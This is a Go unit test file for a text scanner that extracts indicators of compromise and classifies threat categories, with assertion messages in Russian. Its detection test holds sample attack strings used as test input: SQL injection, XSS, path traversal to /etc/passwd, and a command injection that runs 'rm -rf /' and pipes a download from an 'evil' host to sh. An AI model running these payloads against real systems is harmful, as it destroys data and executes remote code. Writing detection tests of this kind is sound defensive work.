package secops

import (
	"strings"
	"testing"
)

func findIOC(r ScanReport, value string) (IOC, bool) {
	for _, i := range r.IOCs {
		if i.Value == value {
			return i, true
		}
	}
	return IOC{}, false
}

func hasThreat(r ScanReport, cat string) bool {
	for _, t := range r.Threats {
		if t.Category == cat {
			return true
		}
	}
	return false
}

func TestScanText_ClassifiesIPs(t *testing.T) {
	txt := "conn from 8.8.8.8 and 192.168.1.10 and 127.0.0.1 and metadata 169.254.169.254"
	r := ScanText(txt)
	if ioc, ok := findIOC(r, "8.8.8.8"); !ok || ioc.Note != "public" {
		t.Errorf("8.8.8.8 должен быть public, got %+v (ok=%v)", ioc, ok)
	}
	if ioc, ok := findIOC(r, "192.168.1.10"); !ok || ioc.Note != "private" {
		t.Errorf("192.168.1.10 должен быть private, got %+v", ioc)
	}
	if ioc, ok := findIOC(r, "127.0.0.1"); !ok || ioc.Note != "loopback" {
		t.Errorf("127.0.0.1 должен быть loopback, got %+v", ioc)
	}
	if ioc, ok := findIOC(r, "169.254.169.254"); !ok || !ioc.Suspicious {
		t.Errorf("169.254.169.254 должен быть suspicious (метаданные), got %+v", ioc)
	}
}

func TestScanText_DetectsThreats(t *testing.T) {
	cases := map[string]string{
		"sqli":           "GET /?id=1 UNION SELECT username,password FROM users",
		"xss":            `comment=<script>alert(1)</script>`,
		"path_traversal": "GET /../../../../etc/passwd",
		"cmd_injection":  "name=x; rm -rf / ; curl http://evil/x | sh",
		"brute_force":    "Failed password for root; authentication failure; invalid user admin",
		"secret_leak":    "config: api_key=SsdkjhKJH23kjh23kjh api_secret",
		"scanner":        "User-Agent: sqlmap/1.5 requesting /wp-login.php and /.env",
	}
	for cat, payload := range cases {
		r := ScanText(payload)
		if !hasThreat(r, cat) {
			t.Errorf("ожидалась категория угрозы %q для payload %q; threats=%+v", cat, payload, r.Threats)
		}
		if cat == "secret_leak" {
			for _, th := range r.Threats {
				if th.Category != "secret_leak" {
					continue
				}
				if strings.Contains(th.Sample, "SsdkjhKJH23kjh23kjh") {
					t.Errorf("sample secret_leak не должен содержать сырой секрет: %q", th.Sample)
				}
				if !strings.Contains(th.Sample, "redacted") && !strings.Contains(th.Sample, "[") {
					t.Errorf("sample secret_leak должен быть редактирован, got %q", th.Sample)
				}
			}
		}
	}
}

func TestScanText_HashesExtracted(t *testing.T) {
	sha := "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
	r := ScanText("hash observed: " + sha)
	if ioc, ok := findIOC(r, sha); !ok || ioc.Type != "sha256" {
		t.Errorf("ожидался sha256 IOC, got %+v (ok=%v)", ioc, ok)
	}
}

func TestScanText_CleanTextNoThreats(t *testing.T) {
	r := ScanText("обычное сообщение пользователя без индикаторов и атак")
	if len(r.Threats) != 0 {
		t.Errorf("на чистом тексте угроз быть не должно, got %+v", r.Threats)
	}
}
